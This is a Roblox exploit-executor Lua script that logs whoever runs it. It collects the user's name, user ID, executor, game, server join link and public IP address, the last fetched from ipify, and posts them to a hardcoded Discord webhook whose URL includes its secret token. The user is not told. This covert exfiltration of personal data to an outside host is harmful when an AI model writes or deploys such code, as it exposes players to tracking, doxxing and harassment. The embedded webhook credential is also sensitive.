local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1368281787347894342/9hd3IIwiiBZtVe27LwgrkxiVAh837qxDvvv7z4nws1Ggu995tn84SXdndYxsKlH88fPA"

local player = Players.LocalPlayer
local username = player.Name
local userId = tostring(player.UserId)
local placeId = game.PlaceId
local jobId = game.JobId
local executor = identifyexecutor and identifyexecutor() or "Unknown"
local ipAddress = "Unavailable"

-- Try to fetch IP
local function fetchIP()
    local request = http_request or request or syn and syn.request or http and http.request
    if request then
        local success, response = pcall(function()
            return request({
                Url = "https://api.ipify.org?format=json",
                Method = "GET"
            })
        end)
        if success and response and response.Body then
            local decoded = HttpService:JSONDecode(response.Body)
            if decoded and decoded.ip then
                ipAddress = decoded.ip
            end
        end
    end
end

pcall(fetchIP)

-- Game name
local gameName = "Unknown Game"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(placeId).Name
end)

-- Payload
local payload = {
    ["embeds"] = {{
        ["title"] = "**🚨 Script Execution Log 🚨**",
        ["color"] = tonumber(0xFFA500),
        ["thumbnail"] = {
            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
        },
        ["fields"] = {
            {["name"] = "👤 Username", ["value"] = username .. "  |  **" .. executor .. "**", ["inline"] = false},
            {["name"] = "🆔 User ID", ["value"] = userId, ["inline"] = true},
            {["name"] = "🌐 IP Address", ["value"] = ipAddress, ["inline"] = true},
            {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = false},
            {["name"] = "🔑 Place ID", ["value"] = tostring(placeId), ["inline"] = true},
            {["name"] = "📝 Job ID", ["value"] = jobId, ["inline"] = false},
            {
                ["name"] = "🔗 Join Link",
                ["value"] = string.format("https://www.roblox.com/games/%d?jobId=%s", placeId, jobId),
                ["inline"] = false
            }
        },
        ["footer"] = {["text"] = "Made by Cat :3"}
    }}
}

-- Send webhook with error handling
local success, message = pcall(function()
    return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
end)

-- Debugging response
if success then
    print("Webhook successfully sent!")
else
    warn("Failed to send webhook: " .. message)
end
